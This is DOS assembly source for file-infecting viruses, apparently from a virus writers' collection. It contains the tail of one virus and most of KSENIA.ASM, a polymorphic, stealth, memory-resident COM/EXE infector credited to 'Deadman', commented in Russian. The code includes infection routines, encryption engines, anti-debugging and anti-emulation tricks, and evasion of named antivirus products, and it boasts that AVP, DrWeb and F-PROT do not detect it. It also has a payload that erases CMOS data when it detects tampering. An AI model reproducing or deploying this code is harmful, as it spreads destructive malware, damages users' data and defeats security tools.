        push    ax                      ; время
        shr     ah,3                    ; берем часы (биты 11-15 в cx)
        cmp     ah,ch                   ; совпадают? если да, то съябываемся,
        je      write_fail              ; чтобы не засветиться

        call    seek2eof                ; а иначе идем в конец файла
        mov     ah,40h                  ; записываемся в файл
        mov     cx,vsize
        cwd
        call    crypt_int21_crypt       ; сначала зашифруемся
        xor     cx,ax                   ; все vsize байт записались?
        jnz     write_fail
        call    seek2bof                ; идем в начало
        mov     ah,40h                  ; записываем видоизмененный
        mov     cx,28                   ; заголовок com/exe файла
        lea     dx,buffer
        call    int21
  write_fail:
        pop     cx dx                   ; вынуть дату и время файла
        mov     ax,5701h                ; установить ее обратно
        call    int21
        ret

 MEM_ENC_END:

 ; Обработчик прерывания int 09h
 int9:  pusha                    ; сохранить используемые регистры
        push    ds cs            ; ds=cs
        pop     ds

        in      al,60h                 ; читать скан-код
        cmp     al,80h                 ; клавишу отпустили?
        jb      quit_9                 ; нет: выходим
        mov     si,point               ; иначе считаем текущий указатель
        cmp     [si],al                ; следующая буква подходит?
        jne     zero_pointer           ; нет: обнулить указатель и выйти
        inc     si                     ; подходит. инкрементировать указатель
        cmp     si,offset keyword+6    ; все 6 букв были нажаты?
        jb      save_it                ; нет: сохранить это значение

        mov     al,0ffh
        out     21h,al

        mov     ax,3
        int     10h

        push    cs
        pop     es
        lea     bp,smb_pattern
        mov     dx,'1'
 modify_keygen:
        mov     cx,1
        mov     ax,1100h
        mov     bx,0e00h
        int     10h
        add     bp,0eh
        inc     dx
        cmp     dx,'6'
        jne     modify_keygen

        mov     ah,1
        mov     ch,100000b
        int     10h

        mov     ax,0b800h
        mov     es,ax
        xor     si,si
        xor     di,di
        mov     cx,endcopy-copy

 Im_here:
        mov     al,cs:copy+si
        mov     ah,0ah
        mov     es:[di],ax
        inc     si
        inc     di
        inc     di
        loop    Im_here
        jmp     $

 zero_pointer:
        lea     si,keyword      ; обнуляем указатель
 save_it:
        mov     point,si        ; а тута сохраняем его
 quit_9:
        pop     ds              ; восстанавливаем всякое дерьмо
        popa
        jmp     dword ptr cs:io9

══════════════════════════════════════════════════════════════════════════════
 ireturn:
        call    restorehost             ; re-сплайсинг
        pop     word ptr cs:buffer      ; garbage
        pop     word ptr cs:buffer
        pop     word ptr cs:buffer
        retf    2

══════════════════════════════════════════════════════════════════════════════
 exithandler:
        push    si ds ax                ; сохранить регистры
        lds     si,dword ptr cs:_addr21 ; считать адрес
        mov     ah,cs:splint
        mov     al,0cdh
        xchg    ax,[si]
        mov     cs:keepword,ax
        pop     ax ds si
        mov     cs:resthost,1

        push    bp
        mov     bp,sp
        sub     word ptr [bp+2],2       ; откорректировать точку
        pop     bp                      ; возврата
        iret                            ; finita la comedia
                                        ; (вроде так)

══════════════════════════════════════════════════════════════════════════════
 restorehost:
        push    ds si ax                ; сохранить регистры
        lds     si,dword ptr cs:io21    ; дать адрес обработчика
        mov     ah,cs:splint
        mov     al,0cdh
        mov     [si],ax                 ; состосить вызов there
        pop     ax si ds                ; восситановить регистры
        ret

        db      4 dup (?)

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Подпрограмма за/раз-шифровки части вируса
; Использует XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG шифровщики
; Случайный ключ
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crypt:
        pushf                           ; сохранить используемые регистры
        pusha
        push    ds

 foolsr:                                ; наебка для дизассемблера
        mov     ax,01ebh                ; перекрывающийся код
        mov     bx,02ebh
        nop
        mov     cx,3ebh
        nop
        nop
        mov     dx,4ebh
        nop
        nop
        nop
        mov     ax,2ebh
        jmp     foolsr+1

        call    extra                   ; вычислить экстра-смещение

        push    0                       ; наебка эвристика
        pop     ds
        mov     si,21h*4                ; будто terminate, а еще и антидЭбаг
        push    dword ptr [si]
        lea     ax,fool_antiv+bp
        push    cs ax
        pop     dword ptr [si]
        mov     ah,0b4h
        int     21h
 cc?:   cmp     dx,0fa01h
        je      $+30h

 fool_antiv:
        pop     ax bx dx
        pop     dword ptr [si]
        cmp     byte ptr cs:cc?+bp,0cch
        jne     bug

        int     19h

 bug:
        db      0b0h                    ; расшифровываем главный
 pre_ki db      000h                    ; механизм
        lea     si,crmain+bp
        mov     cx,endcr-crmain
 de_cr: xor     cs:[si],al              ; простым ксором
        inc     si
        loop    de_cr

 crmain:                                ; главный механизм
        jmp     overtable

 algorithm dw   9090h                   ; алгоритм
 crtable label  word                    ; таблица зашифровщиков
        xor     dl,cl
        add     dl,cl
        sub     dl,cl
        not     dl
        inc     dl
        dec     dl
        ror     dl,cl
        rol     dl,cl
        neg     dl

 decrtable label word                   ; таблица расшифровщиков
        xor     dl,cl
        sub     dl,cl
        add     dl,cl
        not     dl
        dec     dl
        inc     dl
        rol     dl,cl
        ror     dl,cl
        neg     dl

 overtable:
        db      0ebh,decrypt-overtable-2

        in      al,40h                  ; получить случайное число
        sub     al,9
        jnc     $-2
        add     al,9
        cbw
        add     ax,ax
        mov     si,ax

        mov     ax,cs:[crtable+si+bp]   ; взять зашифровщик
        mov     cs:[algorithm+bp],ax
        in      al,40h
        mov     cs:[value+bp],al
        mov     bx,si

 decrypt:
        mov     ax,cs:algorithm+bp
        mov     si,208h
        push    dword ptr [si]
        mov     word ptr [si],ax
        mov     byte ptr [si+2],0cbh
        xor     byte ptr cs:overtable+bp+1,decrypt-overtable-2

        lea     si,enc_start+bp          ; инициализация
        mov     cx,crypt-enc_start
        db      0b0h
 value  db      ?

 decrvirus:
        mov     dl,byte ptr cs:[si]     ; наконец-то!!!
        xor     al,cl
        xchg    al,cl
        db      09ah
        dw      208h,0
        xchg    al,cl
        mov     byte ptr cs:[si],dl
        inc     si
        loop    decrvirus
        pop     dword ptr ds:[208h]

 endcr: mov     si,bx
        mov     ax,word ptr cs:[decrtable+bp+si]
        mov     cs:[algorithm+bp],ax

        lea     si,crmain+bp    ; encrypt main engine
        mov     cx,endcr-crmain
        in      al,40h
        mov     cs:pre_ki+bp,al
 c2:    xor     cs:[si],al
        inc     si
        loop    c2

        pop     ds
        popa
        popf
 cr_ret:
        ret
 ;_________--------------________
 strategy:
        push    bp
        call    extra
        mov     cs:[req_head+bp],bx
        mov     cs:[req_head+bp+2],es
        pop     bp
        db      68h
 old_strategy   dw  ?
        ret

 win_trick:
        nop
        nop
        db      0eah
 win21  dw      ?,?


 int24h:
        db      0c0h,0e0h,10h           ; shl (или shr) al,10h => zero
        stc
        rcl     al,3                    ; получим al = 4
        dec     al
        iret                            ; ну заебенил !!!

 crypt_int21_crypt:
        call    crypt
        push    offset crypt
 int21:
        pushf                           ; вызов 21-го инта
        db     0ebh,3                   ; применил перекрывающийся код
        mov    ax,04ebh
        jmp    $-2
        dw     0ffffh
        db     09ah                     ; call far ptr ..
 io21   dw     ?,?
        ret

 extra:                                 ; вычисляем дополнительное смещение
        pushf
        push    eax
        db      66h,0b8h
        int     1ch
 subextr:
        jmp     $+4
        jmp     $-4
        mov     bp,sp                   ; считать вершину стека
        mov     bp,word ptr [bp-6]
        sub     bp,offset subextr
        pop     eax
        popf
        ret

 eov:

 io1                    dw      ?,?             ; убежище для векторов
 io9                    dw      ?,?
 io1c                   dw      ?,?
 io24                   dw      ?,?

 req_head               dw      ?,?
 point                  dw      ?               ; для обработчика int 09h
 resthost               db      ?
 _addr21                dw      ?,?
 splint                 db      ?
 keepword               dw      ?
 prev2                  dw      ?               ; начало 21-го обработчика
 stf                    db      ?               ; флаг для общего стелса
 drf                    db      ?               ; флаг для fcb стелса
 seek_pos               dw      ?,?             ; место хранения seekа
 nrbytes                dw      ?               ; тоже для считанных байт
 func_number            dw      ?
 func_jump              dw      ?
 two_bytes              dw      ?
 sys_sp                 dw      ?
 sys_ss                 dw      ?
 psp                    dw      ?

 buffer                 db      vsize dup (?)


 eom:                   end     ksenia

────────────────────────────────────────────────────────────────────────────────
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
 comment ъ

                KSENIA Virus Version 1.0 Copyright (C) Deadman
              └────────────────────────────────────────────────┘

 TSR/COM/EXE fast polymorphic infector
  Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h
     (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)
  Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h
     (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)
  Redirection stealth on 3Fh/42h (Read/LSeek)
  SFT stealth without using any SFT values (for Novell/Win95 compatibility)
  Disinfects the host on 40h (Write)
  Re-Hooks Int 21h vector after Win95 installation. Works perfectly!
  Re-Hooks Int 21h vector if virus handler has been removed from the chain
  Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect
  Virus stays resident in low memory, executing the host with 4B00h function
  When some of AVs are executing, virus adds some parameters to cmdline
  Polymorphic in files uses its internal polymorphic engine
  Engine uses table-based instructions as a random size garbage (85% of 8086)
  Engine uses different count and index registers
  Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)
  Has a second internal shield (secondary encrypts itself with a kewl method)
  Will not infect files with a current hour stamp
  Filenames with digits will not be infected
  Will not infect AVP/DrWeb/Web/F-Prot/TB/ADInf/Clean/Scan/NOD/VSafe/Anti/NAV/FV/FindViru/Command
  Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/BACKUP/MSBACKUP/ScanDisk/NDD are running
  Intercepts Int 24h to disallow user be warned by a critial error message
  Virus was analysed by these AVs
      AVP 3.0.130 - No detection or warns
      DRWEB 4.11  - No detection or warns
      F-PROT 3.05 - No detection or warns

                                 Deadman from hell. E-Mail: dman@mail.ru ъ

 vsize  equ     eov-ksenia      ; дисковая память для вируса
 msize  equ     eom-ksenia      ; размер памяти требуемой вирусу
 crlen  equ     256             ; размер расшифровщика

 B      equ     <byte ptr>      ; некоторые сокращения
 W      equ     <word ptr>
 D      equ     <dword ptr>

 mvs    macro   Seg1,Seg2       ; макрос
        push    Seg2            ; mvs es,cs -> push cs/pop es
        pop     Seg1
        endm

        model   tiny            ; ШАПКА
        codeseg
        p386
        org     100h
 ksenia:
        xor     bp,bp           ; нужно для 1-го запуска вируса
        call    crc             ; подсчет CRC вируса
        cmp     checksum,eax    ; сравнение CRC32
        je      shield          ; эти CRLEN байт зарезервированы в теле

        lea     di,r_crc
        mov     cx,4
 trans: rol     eax,8
        push    ax
        call    hex2a
        stosw
        pop     ax
        loop    trans

        mov     ah,9            ; вируса для полиморфного расшифровщика
        lea     dx,badcrc
        int     21h
        mov     ax,4c02h
        int     21h

 hex2a: aam     10h
        add     ax,3030h
        cmp     al,':'
        jb      $+4
        add     al,7
        xchg    al,ah
        cmp     al,':'
        jb      $+4
        add     al,7
        ret

 badcrc db      'Virus code has been modified. The correct CRC is '
 r_crc  db      '00000000h',0dh,0ah,24h

        org     ksenia+CRLEN

        cld
        mov     ah,30h          ; запрос версии ДОС, но это только для
        int     21h             ; виду. На самом деле берем из стека
 ip:    mov     bp,sp
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ip    ; вычисляем разность смещений (delta)

        push    ds 0ffffh       ; так я обломал эмулятор web'а
        pop     ds
        mov     al,ds:[7]       ; читаем байт из ROM
        pop     ds              ; обычно в этом месте хранится дата
        xor     al,2fh          ; и вирус читает slash из этой даты
        cbw                     ; AX=00
        inc     ax              ; AX=01
        mov     dx,ax           ; DX=01

        lea     si,original-1+bp ; второе (внутреннее) кольцо защиты вируса
        mov     cx,original-shield-1
 turbo: mov     al,cs:[si]      ; краткая структура:
        add     cs:[si-1],al    ; ДО:    byte1 byte2 byte3 byte4
        sub     si,dx           ; ПОСЛЕ: b1+b2 b2+b3 b3+b4 b4+b5
        loop    turbo

 shield:
        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jne     install         ; памяти

        lea     si,original+bp  ; si-сохраненное начало хоста
        mov     ax,cs:[si]
        cmp     ax,'MZ'         ; откуда запустили вирус?
        je      run_exe         ; если начинается на 'MZ' или 'ZM'
        cmp     ax,'ZM'         ;  -> из EXE
        je      run_exe         ; иначе из СОМ

        mov     di,0100h        ; стартовали из СОМ
        mov     cx,32
        rep     movsb           ; восстановить в памяти
        mov     si,100h         ; начало зараженного файла
        mov     dx,cs
        jmp     restp

 run_exe:
        mov     ax,es
        add     ax,010h
        add     cs:[si+16h],ax  ; старое CS
        add     ax,cs:[si+0eh]  ; старое SS
        mov     dx,cs:[si+10h]  ; старое SP
        mov     ss,ax
        mov     sp,dx
        mov     dx,cs:[si+16h]  ; CS
        mov     si,cs:[si+14h]  ; IP

 restp: push    dx si
        xor     ax,ax           ; восстановить регистры
        xor     bx,bx
        mov     cx,0ffh
        mov     dx,ds
        mov     di,sp
        add     di,4
        mov     bp,912h
        retf                    ; отдать управление программе

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 install:
        mov     di,100h         ; ES:DI = PSP:0100
        mvs     ds,cs           ; DS:SI = код вируса
        lea     si,ksenia+bp    ; копируем код вируса поверх зараженной
        mov     cx,msize        ; программы сразу после PSP
        db      6ah,00h         ; загружаем в стек команды для
        db      66h,68h         ; копирования вируса
        db      0f3h,0a4h,0cah,6
        push    es offset done  ; rep movsb / retn 6
        mov     ax,sp
        add     ax,4
        cld
        jmp     far ptr ax

 done:  mov     ax,cs           ; мы на новом месте, с правильным
        mov     ds,ax           ; смещением, как при компиляции
        mov     seg0,ax         ; заполнение сегментных полей в EPB
        mov     seg1,ax
        mov     seg2,ax

        call    WinOldAp        ; получение статуса инсталляции WinOldAp
        mov     w95state,ax     ; сохранение флажка

        mov     ax,3521h        ; AH=35 AL=INT# - функция для получения
        int     21h             ; вектора прерывания AL
        mov     io21p,bx        ; сохранить вектор в ячейке памяти
        mov     io21p+2,es
        call    set_dup         ; установить 21-й вектор прерывания на другой
        mov     ax,2521h        ; установить свой обработчик
        lea     dx,handler      ; прерывания
        int     21h
        mov     ax,3508h        ; запрос вектора прерывания
        int     21h
        mov     io08,bx         ; сохранение вектора в ячейках памяти
        mov     io08+2,es
        mov     ax,2508h        ; установка прерывания 08h (таймер)
        lea     dx,vguard       ; для проверки целостности кода
        int     21h

        call    FixVirus        ; заражение некоторых важных файлов

        mov     ah,4ah          ; уменьшить до нужного размера блок
        mov     bx,(msize+100h)/16+2 ; памяти, выделенный программе
        mvs     es,cs
        int     21h

        mov     si,2ch          ; PSP:2Ch = сегмент окружения
        mov     ds,[si]         ; поместить его в DS
        xor     ax,ax
        mov     si,-1

 escan: inc     si              ; сканним пока не найдем DW 0
        cmp     W [si],ax       ; за ним следует имя файла (программы),
        jne     escan           ; из которой был запушен вирус
        lea     dx,[si+4]       ; dx -> имя

        mov     ax,cs           ; проинициализируем стековые указатели
        mov     ss,ax           ; а то они болтаются где-то внизу //
        lea     sp,stacks+size stacks

        mov     ax,4b00h        ; запускаем носителя
        lea     bx,epb          ; ES:BX = EPB
        int     21h

        mov     si,2ch
        mov     es,cs:[si]      ; получение сегмента окружения
        mov     ah,49h          ; освобождение блока памяти
        int     21h

        mov     ax,cs           ; маскируем наш блок памяти так, как будто
        dec     ax              ; он содержит только наш PSP. А под себя
        mov     ds,ax           ; построим другой блок памяти, следующий
        xor     si,si           ; прямо за PSP. При завершении программы
        mov     al,4dh          ; наш блок памяти не будет освобожен.
        xchg    B [si],al
        mov     W [si+3],0fh    ; Память под MCB нам любезно предоставлена
        mov     B [si+100h],al  ; командной строкой (PSP+0F0h)
        mov     W [si+101h],8   ;
        mov     W [si+103h],msize/16+2

        mov     ah,4dh          ; AH=4Dh (WAIT)
        int     21h             ; получить ErrorLevel запущенной программы
        mov     ah,4ch          ; AH=4Ch (EXIT)
        int     21h             ; выйти в DOS без всяких подозрений

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Область данных
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

 copyright    db      'Ksenia.'
              db      vsize/1000 mod 10+'0'
              db      vsize/100  mod 10+'0'
              db      vsize/10   mod 10+'0'
              db      vsize      mod 10+'0'
              db      ' Version 1.0 Copyright (C) by Deadman',0

 v_id         db      '[KSENIA/Deadman]',0
 ssize        equ     $-v_id

 extens       db      '.com',0  ; расширения файлов, которые мы
              db      '.exe',0  ; инфицируем
              db      0

 prms         db      'DRWEB' ,0,0,' /NM'   ,0dh
              db      'F-PROT',0,0,' /NOMEM',0dh
              db      'AVP'   ,0,0,' /M'    ,0dh
              db      0

 AVs          db      'AVP',0   ; их вирус трогать не будет
              db      'DrWeb',0
              db      'Web',0
              db      'F-Prot',0
              db      'TB',0
              db      'ADInf',0
              db      'Clean',0
              db      'Scan',0
              db      'NOD',0
              db      'VSafe',0
              db      'Anti',0
              db      'NAV',0
              db      'FV',0
              db      'FindViru',0
              db      'Command',0
              db      0

 windir       db      'WINBOOTDIR=',0,0
 comspec      db      'COMMAND',0,0

 fixes        db      '\SYSTEM\CONAGENT.EXE',0
              db      '\COMMAND\MODE.COM',0
              db      0

 stlock       db      'PkZip',0 ; программы, во время работы которых
              db      'RAR',0   ; отключаются стелс-функции вируса
              db      'ARJ',0
              db      'LHA',0
              db      'ARC',0
              db      'ZOO',0
              db      'DEFRAG',0
              db      'SPEEDISK',0
              db      'ChkDsk',0
              db      'BACKUP',0
              db      'MSBACKUP',0
              db      'ScanDisk',0
              db      'NDD',0
              db      0

 funcs        dw      1856h,tsrtest     ; проверка зараженности памяти (NULL)
              dw      4AFFh,rehook      ; re-перехват вектора (SETBLOCK)

              dw      3DFFh,infect      ; заражение (OPEN)
              dw      1857h,infect      ; заражение (VIXFIRUS)
              dw      41FFh,infect      ; заражение (DEL)
              dw      43FFh,infect      ; заражение (CHMOD)
              dw      4BFFh,infect      ; заражение (EXEC)
              dw      56FFh,infect      ; заражение (REN)
              dw      6C00h,extinfect   ; заражение (EXTOPEN)
              dw      7141h,lfninfect   ; заражение (LFN DEL)
              dw      7143h,lfninfect   ; заражение (LFN CHMOD)
              dw      7156h,lfninfect   ; заражение (LFN REN)
              dw      716Ch,extlfninf   ; заражение (LFN OPEN)
              dw      71A9h,extlfninf   ; заражение (LFN SERVER OPEN)

              dw      11FFh,fcbstealth  ; стелс (FCB)
              dw      12FFh,fcbstealth  ; стелс (FCB)
              dw      4EFFh,dtastealth  ; стелс (DTA)
              dw      4FFFh,dtastealth  ; стелс (DTA)
              dw      714Eh,lfnstealth  ; стелс (LFN)
              dw      714Fh,lfnstealth  ; стелс (LFN)
              dw      71A6h,infstealth  ; стелс (LFN HANDLE INFO)
              dw      5700h,date_get    ; стелс (GET DATE)
              dw      5701h,date_set    ; стелс (SET DATE)
              dw      42FFh,seekstealth ; стелс (LSEEK)
              dw      3FFFh,readstealth ; стелс (READ)
              dw      40FFh,diswrite    ; стелс (WRITE)

              dw      3EFFh,patchsft    ; корректировка SFT
              dw      44FFh,patchsft    ; корректировка SFT
              dw      45FFh,patchsft    ; корректировка SFT
              dw      46FFh,patchsft    ; корректировка SFT
              dw      68FFh,patchsft    ; корректировка SFT
              dw      0


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 08 (Virus Guard)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 vguard:
        call    SaveRegs        ; сохранение регистров
        inc     cs:delay        ; проверка будет происходить примерно
        cmp     cs:delay,18     ; каждую секунду
        jb      exit_guard
        mov     cs:delay,0
        call    crc             ; подсчет CRC теля вируса
        cmp     cs:checksum,eax ; сравнение ее с эталонной
        jz      crc_ok

        mov     al,0ffh         ; запрещение всех прерываний
        out     21h,al

        mov     cx,40h          ; затираем данные CMOS
 cmos:  mov     ax,cx
        out     71h,al
        jmp     $+2
        out     70h,al
        loop    cmos
        jmp     $

 crc_ok:
        mov     ax,1856h        ; проверяем, никто ли не выкидывал наш
        int     21h             ; обработчик 21-го прерывания из общей
        cmp     ax,3265h        ; цепи?
        je      exit_guard

        mov     ax,3521h        ; запрос вектора int 21h
        int     21h
        call    set_dup         ; установить 21-й вектор прерывания на другой
        lea     dx,manager      ; здесь нужно переустановить вектор
        call    chk_dup         ; находим место, куда указывал вектор
        jnz     reset           ; в последние годы своей жизни
        lea     dx,handler
 reset: mov     ax,2521h        ; переустанавливаем вектор
        mvs     ds,cs
        int     21h

 exit_guard:
        call    LoadRegs
        jmp     d cs:io08

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 21
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 handler:
        call    chk_dup         ; проверка, не переустановили ли вектор
        jz      manager         ; это бывает после загрузки Win95
        jmp     D cs:io21p      ; иначе мы тут ни при чем

 manager:
        call    SaveRegs        ; сохранить все регистры

        mov     cs:save_ax,ax   ; соохранение параметров
        mov     cs:save_bx,bx   ; будут использоваться (Filename), если
        mov     cs:save_es,es   ; функция = 4b00 и заппускаемый файл - AV

        lea     si,funcs        ; есть табличка, по которой обрабатываются
 fscan: cmp     ah,cs:[si+1]    ; нужные функции int 21 (db F#, dw offset)
        jne     lnext           ; сравниваем al с текущей ячейкой таблицы
        cmp     B cs:[si],0ffh  ; проверка на ненужность проверки подфункции
        je      ljump
        cmp     B cs:[si],al    ; проверка подфункции
        jne     lnext

 ljump: call    mcbcheck        ; функция найдена: проверка MCB (для stealth)
        push    W cs:[si+2]     ; берем смещение обработчика для функции
        jmp     LoadRegs        ; восстанавливаем регистры

 lnext: add     si,4            ; берем следующую запись из таблицы
        cmp     w cs:[si],0     ; проверка конца таблицы
        jnz     fscan
        call    LoadRegs        ; обработчик для этой функции так и не
        jmp     ExitHandler     ; найден: отдаем управление

 exithandler:
        push    ax ax es bx bp  ; сохранение ES:BX и резервирование места
        call    get_dup         ; получение оригинального вектора int 21h
        mov     bp,sp
        mov     [bp+6],bx       ; занос вектора в две свободные ячейки
        mov     [bp+8],es       ; в стеке
        pop     bp bx es        ; восстановление регистров ES:BX
        retf                    ; передача управления DOS

 ireturn:
        retf    2               ; возврат с уничтожением флагов в стеке

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Заражение файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 extlfninf:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     lfnbreak

 lfninfect:
        call    SaveRegs        ; сохранить в стеке регистры

 lfnbreak:
        call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    LFNClrAttrib    ; очистка аттрибутов файла
        jc      noinf
        call    LFNOpenFile     ; открытие файла для R/W
        jc      LFNga
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 LFNga: call    LFNRestAttrib   ; восстановление аттрибутов файла
        jmp     noinf

 extinfect:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     break
 infect:
        call    SaveRegs        ; сохранить в стеке регистры
 break: call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    ClrAttrib       ; очистка аттрибутов файла
        jc      noinf
        call    OpenFile        ; открытие файла для R/W
        jc      RAttr
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 Rattr: call    RestAttrib      ; восстановление аттрибутов файла
 Noinf: call    Remove24        ; восстановление обработчика int 24h
        call    LoadRegs        ; восстановление регистров
        cmp     ah,3dh
        je      sftstealth
        cmp     ax,6c00h
        je      sftstealth
        jmp     exithandler

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SFT stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sftstealth:
        call    int21           ; открыть нужный файл
        call    SaveRegs        ; сохранение регистров
        jc      no_sft
        xchg    ax,bx
        call    CloseSFT        ; закрыть SFT
 no_sft:
        call    LoadRegs
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; FCB stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 fcbstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        cmp     al,0ffh         ; найдено что-нибудь?
        jz      no_fcb
        cmp     cs:stf,0        ; работать можно?
        jnz     no_fcb
        cmp     cs:command,0    ; это запрос command.com'а?
        jnz     no_fcb

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        cmp     B es:[bx],0ffh  ; расширенное FCB?
        jne     usual
        add     bx,7
 usual: lea     si,[bx+14h]     ; si -> дата файла
        lea     di,[bx+1Dh]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_fcb:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DTA stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 dtastealth:
        call    int21           ; вызвать функцию DOS
